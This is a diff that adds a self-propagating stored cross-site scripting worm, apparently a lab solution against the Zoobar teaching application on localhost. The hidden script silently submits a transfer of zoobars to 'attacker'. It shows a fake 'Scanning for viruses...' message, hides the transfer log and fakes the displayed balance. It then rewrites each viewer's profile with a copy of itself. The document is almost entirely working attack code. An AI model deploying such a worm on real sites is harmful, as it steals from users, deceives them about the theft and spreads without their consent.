@@ -1,0 +1,55 @@
+</b></div>
+<div id="profile_worm">
+<div style="display:none">
+<form method="POST" id="transferform" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="new_iframe">
+<input name="zoobars" type="text" value="1" size=5 style="display:none">
+<input name=recipient type=text value="attacker" size=10 style="display:none">
+<input type="submit" name="submission" value="Send">
+</form>
+</div>
+<iframe id="newiframe" name="new_iframe" src="" style="display:none"></iframe>
+<div style="display:none">
+<form method="POST" id="profileform" name="profileform" action="http://localhost:8080/zoobar/index.cgi/" target="new_iframe2">
+    <textarea id="profile_update" name="profile_update" rows="20" cols="80"></textarea>
+    <input type="submit" name="profile_submit" value="Save" />
+</form>
+</div>
+<iframe id="attack_iframe2" name="new_iframe2" src="" style="display:none"></iframe>
+<script type="text/javascript">
+  function zoobarTransfer() {
+    document.getElementById('transferform').submit();
+  }
+  function displayScanVirus(argument) {
+    var atkprofile = document.getElementById("profile");
+    var newele = document.createElement("b");
+    var newcontent = document.createTextNode("Scanning for viruses...");
+    newele.appendChild(newcontent);
+    atkprofile.appendChild(newele);
+  }
+  function hideTableLog(argument) {
+    var tableTransfer = document.getElementsByClassName("log")[0];
+    tableTransfer.tBodies[0].setAttribute("style","display:none");
+  }
+  function show10Zoobar(argument) {
+    var zoobarsEle = document.getElementById("zoobars");
+    zoobarsEle.setAttribute("class",10);
+    total = 10;
+    showZoobars(0);
+  }
+  function addWormToTargetProfile(argument) {
+    var profile_worm = document.getElementById('profile_worm');
+    var profile_update = document.getElementById('profile_update');
+    var before = '</b></div><div id='+'profile_worm'+'>';
+    var after = '</div>';
+    profile_update.textContent = before + profile_worm.innerHTML + after;
+    document.getElementById('profileform').submit();
+  }
+  document.addEventListener("DOMContentLoaded", function(event) { 
+    zoobarTransfer();
+	displayScanVirus();
+	hideTableLog();
+	show10Zoobar();
+	addWormToTargetProfile();
+  });
+</script>
+</div>
